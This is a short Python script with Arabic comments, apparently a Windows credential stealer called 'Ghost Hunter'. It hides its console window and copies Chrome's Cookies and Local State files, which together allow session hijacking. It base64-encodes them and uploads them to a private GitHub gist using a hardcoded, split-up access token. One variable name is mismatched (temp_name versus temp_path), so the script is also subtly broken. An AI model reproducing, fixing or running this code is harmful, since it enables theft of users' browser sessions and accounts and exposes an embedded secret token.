import os, requests, base64, shutil, sys, ctypes

# التوكن
A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
TOKEN = A + B + C

def hide_console():
    # إخفاء نافذة الـ Console فوراً لمنع الإغلاق المفاجئ
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)

def ghost_hunter():
    hide_console()
    appdata = os.getenv('LOCALAPPDATA')
    chrome_path = os.path.join(appdata, r'Google\Chrome\User Data')
    found_data = {}
    error_log = ""

    try:
        if not os.path.exists(chrome_path):
            error_log = "Chrome path not found"
        else:
            for root, dirs, files in os.walk(chrome_path):
                for file in files:
                    if file in ['Cookies', 'Local State']:
                        try:
                            full_path = os.path.join(root, file)
                            profile = os.path.basename(os.path.dirname(root))
                            temp_name = os.path.join(os.getenv('TEMP'), f'tmp_{file}')
                            
                            # محاولة النسخ بأمر النظام (أكثر قوة)
                            os.system(f'copy /y "{full_path}" "{temp_name}" > nul')
                            
                            if os.path.exists(temp_path):
                                with open(temp_path, 'rb') as f:
                                    found_data[f"{profile}_{file}"] = base64.b64encode(f.read()).decode('utf-8')
                                os.remove(temp_path)
                        except Exception as e:
                            error_log += f"Error at {file}: {str(e)}\n"
    except Exception as e:
        error_log = f"Global Error: {str(e)}"

    # إرسال النتيجة أو الخطأ
    headers = {"Authorization": f"token {TOKEN}"}
    content_to_send = str(found_data) if found_data else f"No Data Found. Log: {error_log}"
    
    payload = {
        "description": "Ghost Hunter Report",
        "public": False,
        "files": {"report.json": {"content": content_to_send}}
    }
    requests.post("https://api.github.com/gists", headers=headers, json=payload)

if __name__ == "__main__":
    ghost_hunter()
    
